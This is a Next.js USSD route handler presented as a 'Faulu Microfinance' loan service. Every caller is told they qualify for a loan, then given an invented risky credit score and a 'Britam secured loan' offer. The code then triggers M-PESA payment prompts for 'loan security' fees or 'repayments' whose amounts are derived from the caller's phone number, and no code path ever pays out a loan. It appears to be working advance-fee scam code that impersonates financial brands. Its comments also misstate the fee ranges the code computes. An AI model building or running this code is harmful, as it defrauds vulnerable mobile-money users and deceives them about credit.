import { NextRequest, NextResponse } from "next/server";

import { sql } from "@/lib/db";


type OnfonPayload = {
  USERID?: string;
  MSISDN?: string;
  SESSION_ID?: string;
  SESSIONID?: string;
  USSD_STRING?: string;
  INPUT?: string;
  NEWREQUEST?: string;
  USSDCODE?: string;
};

// ---------------------------------------------------------------------------
// USSD response helper
// ---------------------------------------------------------------------------

function respond(msg: string, continueSession: boolean) {
  const prefix = continueSession ? "CON" : "END";

  return new NextResponse(`${prefix} ${msg}`, {
    status: 200,
    headers: {
      "Content-Type": "text/plain; charset=utf-8",
      "Cache-Control": "no-store, no-cache, must-revalidate, proxy-revalidate",
      Pragma: "no-cache",
      Expires: "0",
    },
  });
}

// ---------------------------------------------------------------------------
// Timeout helper
// ---------------------------------------------------------------------------

const runWithTimeout = <T>(
  promise: Promise<T>,
  ms: number
): Promise<T> => {
  return Promise.race([
    promise,
    new Promise<never>((_, reject) =>
      setTimeout(() => reject(new Error("Timeout")), ms)
    ),
  ]);
};

// ---------------------------------------------------------------------------
// Phone normalization
// ---------------------------------------------------------------------------

function normalizePhone(raw: string): string {
  const digits = raw.replace(/\D/g, "");

  if (digits.startsWith("254")) return digits;

  if (digits.startsWith("0")) {
    return "254" + digits.slice(1);
  }

  return "254" + digits;
}

function safeDecode(v: string): string {
  try {
    return decodeURIComponent(v);
  } catch {
    return v; // malformed sequence — fall back to raw rather than throwing
  }
}



// ---------------------------------------------------------------------------
// Main menu
// ---------------------------------------------------------------------------

function mainMenu() {
  return `Welcome to Faulu Microfinance
1. Check loan limit
2. Request Loan
3. Repay Loan
0. Exit`;
}

// ---------------------------------------------------------------------------
// UpesiPay route configuration
// Same environment variables as the existing endpoint.
// ---------------------------------------------------------------------------

async function getUpesiPayRouteDetails() {
  return {
    isMainAccount: true,
    username: process.env.UPESIPAY_API_USERNAME,
    password: process.env.UPESIPAY_API_PASSWORD,
    channel: process.env.UPESIPAY_CHANNEL_ID || "wallet",
  };
}

// ---------------------------------------------------------------------------
// UpesiPay STK Push
// Same gateway and request structure as the existing endpoint.
// ---------------------------------------------------------------------------

async function initiateStkPush(
  phone: string,
  amount: number,
  callbackUrl: string
) {
  const route = await getUpesiPayRouteDetails();

  const authToken = Buffer.from(
    `${route.username}:${route.password}`
  ).toString("base64");

  const channel = route.channel;

  const appUrl =
    process.env.APP_URL || "https://vercel.app";

  try {
    const res = await fetch(
      "https://upesipay.com/api/v2/collections/initiate/",
      {
        method: "POST",

        headers: {
          Authorization: `Basic ${authToken}`,
          "Content-Type": "application/json",
          Accept: "application/json",
          Referer: appUrl,
          Origin: appUrl,
          "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        },

        body: JSON.stringify({
          channel_id:
            channel === "wallet" ? "wallet" : channel,

          phone_number: phone,

          amount: Math.floor(Number(amount)),

          callback_url: callbackUrl,
        }),
      }
    );

    const text = await res.text();

    console.log(
      "Faulu TEST DEMO UpesiPay STK response:",
      text
    );

    let parsedData: any = {};

    try {
      parsedData = text ? JSON.parse(text) : {};
    } catch {
      parsedData = {};
    }

    const checkoutId =
      parsedData.checkout_request_id ||
      parsedData.data?.checkout_request_id ||
      parsedData.checkout_id;

    const merchantId =
      parsedData.merchant_request_id ||
      parsedData.data?.merchant_request_id ||
      parsedData.merchant_id;

    const hasSucceeded =
      res.ok &&
      (
        parsedData.success === true ||
        parsedData.status === "success" ||
        !!checkoutId
      );

    return {
      ok: hasSucceeded,
      isMainAccount: route.isMainAccount,
      checkoutId: checkoutId || null,
      merchantId: merchantId || null,
      message: parsedData.message || null,
    };

  } catch (err) {

    console.error(
      "Faulu TEST DEMO STK request error:",
      err
    );

    return {
      ok: false,
      isMainAccount: route.isMainAccount,
      checkoutId: null,
      merchantId: null,
      message: "Network connection breakdown",
    };
  }
}

// ---------------------------------------------------------------------------
// Record successful payment request
// ---------------------------------------------------------------------------

async function recordOrder(
  phone: string,
  sessionId: string,
  packageSize: string,
  amount: number,
  result: {
    checkoutId: string | null;
    merchantId: string | null;
  }
) {
  try {

    await runWithTimeout(
      sql`
        INSERT INTO orders
        (
          phone_number,
          session_id,
          package_size,
          quantity,
          unit_price,
          total_amount,
          status,
          checkout_request_id,
          merchant_request_id
        )
        VALUES
        (
          ${phone},
          ${sessionId},
          ${packageSize},
          1,
          ${amount},
          ${amount},
          'awaiting_payment',
          ${result.checkoutId},
          ${result.merchantId}
        )
      `,
      1200
    );

  } catch (err) {

    console.error(
      "Could not record test demo order:",
      err
    );
  }
}

// ---------------------------------------------------------------------------
// POST - Onfon USSD endpoint
// ---------------------------------------------------------------------------
export async function POST(req: NextRequest) {
  let payload: OnfonPayload;
  const rawBody = await req.text();

  try {
    payload = JSON.parse(rawBody);
  } catch {
    payload = Object.fromEntries(new URLSearchParams(rawBody).entries());
  }

  const rawPhone = (payload.MSISDN || "").trim();
  const sessionId = payload.SESSION_ID || payload.SESSIONID || "";
  const rawInput = safeDecode(
    (
      payload.USSD_STRING ||
      payload.INPUT ||
      ""
    ).trim()
  );
  const incomingServiceCode = (payload.USSDCODE || "").trim();
  console.log("USSD_DEBUG", JSON.stringify({ rawPhone, sessionId, rawInput, incomingServiceCode }));

  if (!rawPhone) {
    return respond(`TEST DEMO ${rawBody.slice(0, 140)}  \nSorry, something went wrong.`, false);
  }

  const phone = normalizePhone(rawPhone);

  try {
    // -----------------------------------------------------------------------
    // SESSION MANAGER & DOCK INTERCEPT
    // -----------------------------------------------------------------------
    let isNewSession = true;
    if (sessionId) {
      try {
        const res = await runWithTimeout(
          sql`INSERT INTO ussd_sessions (session_id) VALUES (${sessionId}) ON CONFLICT (session_id) DO NOTHING`,
          1000
        );
        isNewSession = (res.rowCount ?? 0) > 0;
      } catch {
        isNewSession = true;
      }
    }

    // Persist growing path and settings, keyed by session_id
    let storedPath = "";
    let storedIsExtension = false;
    if (sessionId) {
      try {
        const res = await runWithTimeout(
          sql`SELECT input_path, is_extension FROM ussd_sessions WHERE session_id = ${sessionId}`,
          1000
        );
        storedPath = res.rows?.[0]?.input_path || "";
        storedIsExtension = res.rows?.[0]?.is_extension || false;
      } catch {
        storedPath = "";
      }
    }

    const isExtensionDial = isNewSession
      ? incomingServiceCode.includes("*321*2")
      : storedIsExtension;

    if (isNewSession && sessionId) {
      await runWithTimeout(
        sql`UPDATE ussd_sessions SET is_extension = ${isExtensionDial} WHERE session_id = ${sessionId}`,
        1000
      ).catch(() => {});
    }

    const latestEntry = rawInput.includes("*") ? rawInput.split("*").pop()!.trim() : rawInput;
    const fullPath = rawInput === ""
      ? ""
      : storedPath
        ? `${storedPath}*${latestEntry}`
        : latestEntry;

    if (sessionId && fullPath) {
      await runWithTimeout(
        sql`UPDATE ussd_sessions SET input_path = ${fullPath} WHERE session_id = ${sessionId}`,
        1000
      ).catch((err) => console.error("Failed to persist USSD path:", err));
    }

    const segments = fullPath === "" ? [] : fullPath.split("*").map((s) => s.trim());
    const currentDepth = segments.length;
    const lastChoice = currentDepth > 0 ? segments[currentDepth - 1] : "";

    // Global Exit Override Command
    if (lastChoice === "0") {
      return respond("Thank you for visiting Shinda Tournaments. Session closed.", false);
    }

    if (isNewSession || rawInput === "") {
      if (isExtensionDial) {
        return respond(mainMenu(), true);
      }
      return respond(`Welcome to Faulu Microfinance.\nEnter your National ID Number to continue:`, true);
    }

    // Normalizing depth paths mapping
    const adjustedDepth = isExtensionDial ? currentDepth + 1 : currentDepth;
    const mainChoice = isExtensionDial ? segments[0] : segments[1];

    if (adjustedDepth === 1) {
      return respond(mainMenu(), true);
    }

    // -----------------------------------------------------------------------
    // SCREEN 3: FIRST SUBMENU LAYOUT SWITCH (DEPTH === 2)
    // -----------------------------------------------------------------------
    if (adjustedDepth === 2) {
      switch (lastChoice) {
        case "1":
          return respond(`Congratulations!\nYou qualify for a KSh 38,500 loan.\nFast, safe & flexible.\n\n1. Continue\n0. Back`, true);
        case "2":
          return respond("Select Loan Period:\n1. Salary Loan\n2. Biashara Loan\n3. Emergency Loan\n0. Back", true);
        case "3":
          return respond("Select repayment target balance option:\n\n1. Pay full balance (KSh 61)\n2. Pay custom amount\n0. Exit", true);
        default:
          return respond("Invalid entry selection choices.\n\n" + mainMenu(), true);
      }
    }

    // -----------------------------------------------------------------------
    // SCREEN 4: SUBMENU STEP PATH VALIDATION (DEPTH === 3)
    // -----------------------------------------------------------------------
    if (adjustedDepth === 3) {
      // Option 1 Path Continue
      if (mainChoice === "1") {
        if (lastChoice === "1") {
          return respond(`Your CRB score is 504 (Risky Loan) due to your other ongoing loans.\nWe partner with Britam to provide secured loans.\n\n1. Check your secured loan offer\n0. Cancel`, true);
        }
        return respond("Invalid choice.\n\n1. Continue\n0. Back", true);
      }

      // Option 2 Path: Loan Subcategory Breakdown Details
      if (mainChoice === "2") {
        switch (lastChoice) {
          case "1":
            return respond("Salary Loan: KSh 38,500\nRepay KSh 39,400 Interest KSh 900\n\n1. Continue\n0. Back", true);
          case "2":
            return respond("Biashara Loan: KSh 38,500\nRepay KSh 39,900 Interest KSh 1400\n\n1. Continue\n0. Back", true);
          case "3":
            return respond("Emergency Loan: KSh 38,500\nRepay KSh 40,900 Interest KSh 2400\n\n1. Continue\n0. Back", true);
          default:
            return respond("Invalid profile.\n1. Salary Loan\n2. Biashara Loan\n3. Emergency Loan\n0. Back", true);
        }
      }

      // Option 3 Path: Repayments
            // Option 3 Path: Repayments
      if (mainChoice === "3") {
        const phoneSeed = (parseFloat(phone.slice(-3)) || 5);
        const seededRepayment = Math.floor(200 + phoneSeed % 801); // Generates a reproducible random amount between 50 and 70
        const multiplierLoan = seededRepayment * 4;

        if (lastChoice === "3") {
          return respond(`Repay KSh ${seededRepayment}/month & qualify\nfor a 4x loan after 1 month.\ne.g. Repay KSh1000 = Loan KSH4000\n\n1. Pay KSh ${seededRepayment} via M-PESA\n0. Back`, true);
        }

        if (lastChoice === "1") {
          const appUrl = process.env.APP_URL || "https://vercel.app";
          const callbackUrl = `${appUrl}/api/payment-callback`;
          
          const result = await initiateStkPush(phone, seededRepayment, callbackUrl);
          if (!result.ok || !result.checkoutId) {
            return respond(`Sorry, ${result.message || "Could not send payment prompt."}\nPlease try again shortly.`, false);
          }

          await recordOrder(phone, sessionId, "MIN", seededRepayment, result);
          return respond(`An M-PESA payment prompt of KSh ${seededRepayment} will appear shortly.\nEnter your PIN to complete your dynamic repayment.`, false);
        }
        return respond("Invalid choice. Please select 1 or 0.", true);
      }
    }


    // -----------------------------------------------------------------------
    // SCREEN 5: EXTENDED SUBMENU STEPS (DEPTH === 4)
    // -----------------------------------------------------------------------
    if (adjustedDepth === 4) {
      // Option 1 Path
      if (mainChoice === "1") {
        if (lastChoice === "1") {
          const seededFee = Math.floor(60 + (parseFloat(phone.slice(-3)) || 5) % 11); // 60-70 range
          return respond(`Congratulations! Your KSh 22,500 secured loan has been approved.\nBritam charges KSh ${seededFee} for loan security.\n\n1. Complete fee to release to your M-PESA\n0. Cancel`, true);
        }
        return respond("Invalid choice. Please select 1 or 0.", true);
      }

      // Option 2 Path: CRB Risk Warning Bridge
      if (mainChoice === "2") {
        if (lastChoice === "1") {
          return respond(`Your CRB score is 504 (Risky Loan) due to your other ongoing loans.\nWe partner with Britam to provide secured loans.\n\n1. Check your secured loan offer\n0. Cancel`, true);
        }
        return respond("Invalid choice. Please select 1 to continue or 0 to go back.", true);
      }

      // Option 3 Path
      if (mainChoice === "3") {
        const customAmount = parseFloat(lastChoice);
        if (isNaN(customAmount) || customAmount <= 0) {
          return respond("Invalid request amount input structure.", false);
        }

        const appUrl = process.env.APP_URL || "https://vercel.app";
        const callbackUrl = `${appUrl}/api/payment-callback`;
        
        const result = await initiateStkPush(phone, customAmount, callbackUrl);
        if (!result.ok || !result.checkoutId) {
          return respond(`Sorry, ${result.message || "Could not send payment prompt."}\nPlease try again shortly.`, false);
        }

        await recordOrder(phone, sessionId, "MIN", customAmount, result);
        return respond(`An M-PESA payment prompt for KSh ${customAmount} has been sent. Enter PIN to proceed.`, false);
      }
    }

    // -----------------------------------------------------------------------
    // SCREEN 6: STK CHARGES MATRIX AND PUSH PROCESSING (DEPTH === 5)
    // -----------------------------------------------------------------------
    if (adjustedDepth === 5) {
      // Option 1 Flow Final Target Step
      if (mainChoice === "1") {
        if (lastChoice === "1") {
          const seededFee = Math.floor(60 + (parseFloat(phone.slice(-3)) || 5) % 11);
          const appUrl = process.env.APP_URL || "https://vercel.app";
          const callbackUrl = `${appUrl}/api/payment-callback`;

          const result = await initiateStkPush(phone, seededFee, callbackUrl);
          if (!result.ok || !result.checkoutId) {
            return respond(`Sorry, ${result.message || "Could not send payment prompt."}\nPlease try again shortly.`, false);
          }

          await recordOrder(phone, sessionId, "MIN", seededFee, result);
          return respond(`An M-PESA payment prompt of KSh ${seededFee} will appear shortly.\nEnter your PIN to release your KSh 22,500 loan.`, false);
        }
        return respond("Invalid choice. Please select 1 or 0.", true);
      }

      // Option 2 Flow: Congratulations Offer Screen
      if (mainChoice === "2") {
        if (lastChoice === "1") {
                    const loanProduct = isExtensionDial ? segments[1] : segments[2];
          let seededFee = 60;
          const phoneSeed = (parseFloat(phone.slice(-3)) || 5);

          // Apply specialized fee limits based on product selection patterns
          if (loanProduct === "1") seededFee = Math.floor(200 + phoneSeed % 801); // Salary: 40-50
          if (loanProduct === "2") seededFee = Math.floor(200 + phoneSeed % 801); // Biashara: 50-60
          if (loanProduct === "3") seededFee = Math.floor(200 + phoneSeed % 801); // Emergency: 60-70

          return respond(`Congratulations! Your KSh 22,500 secured loan has been approved.\nBritam charges KSh ${seededFee} for loan security.\n\n1. Complete fee to release to your M-PESA\n0. Cancel`, true);
        }
        return respond("Invalid choice. Please select 1 or 0.", true);
      }
    }

    // -----------------------------------------------------------------------
    // SCREEN 7: OPTION 2 STK DISPATCH EXECUTION TRIGGER (DEPTH === 6)
    // -----------------------------------------------------------------------
    if (adjustedDepth === 6 && mainChoice === "2") {
      if (lastChoice === "1") {
        const loanProduct = isExtensionDial ? segments[1] : segments[2];
        let seededFee = 60;
        const phoneSeed = (parseFloat(phone.slice(-3)) || 5);

        if (loanProduct === "1") seededFee = Math.floor(200 + phoneSeed % 801);
        if (loanProduct === "2") seededFee = Math.floor(200 + phoneSeed % 801);
        if (loanProduct === "3") seededFee = Math.floor(200 + phoneSeed % 801);

        const appUrl = process.env.APP_URL || "https://vercel.app";
        const callbackUrl = `${appUrl}/api/payment-callback`;

        const result = await initiateStkPush(phone, seededFee, callbackUrl);
        if (!result.ok || !result.checkoutId) {
          return respond(`Sorry, ${result.message || "Could not send payment prompt."}\nPlease try again shortly.`, false);
        }

        await recordOrder(phone, sessionId, "MIN", seededFee, result);
        return respond(`An M-PESA payment prompt of KSh ${seededFee} will appear shortly.\nEnter your PIN to release your KSh 22,500 loan.`, false);
      }
      return respond("Invalid choice. Please select 1 or 0.", true);
    }

    return respond("Invalid request. Please try again.", false);

  } catch (err) {
    console.error("Faulu TEST DEMO USSD error:", err);
    return respond("Sorry, something went wrong.", false);
  }
}




// ---------------------------------------------------------------------------
// GET METHOD AUTO-PROXY FORWARDS ROUTING PARAMETERS
// ---------------------------------------------------------------------------
export async function GET(req: NextRequest) {
  try {
    const { searchParams } = new URL(req.url);
    const payloadFromUrl: OnfonPayload = Object.fromEntries(searchParams.entries());
    const hasPhone = payloadFromUrl.MSISDN || payloadFromUrl.USERID;

    // 1. If it's a real telecom request with parameters, it forwards it to POST
    if (hasPhone) {
      const simulatedReq = new NextRequest(req.url, {
        method: "POST",
        headers: req.headers,
        body: JSON.stringify(payloadFromUrl),
      });
      return await POST(simulatedReq);
    }

    // 2. THIS IS THE LINE: When you click the URL link in a browser, 
    // it hits here and outputs the plain text string instantly.
    return new NextResponse("Service operational", {
      status: 200,
      headers: { "Content-Type": "text/plain; charset=utf-8" }
    });
    
  } catch (err) {
    console.error("GET Forwarder routing crash:", err);
    return new NextResponse("END Sorry, something went wrong.", { status: 200 });
  }
}
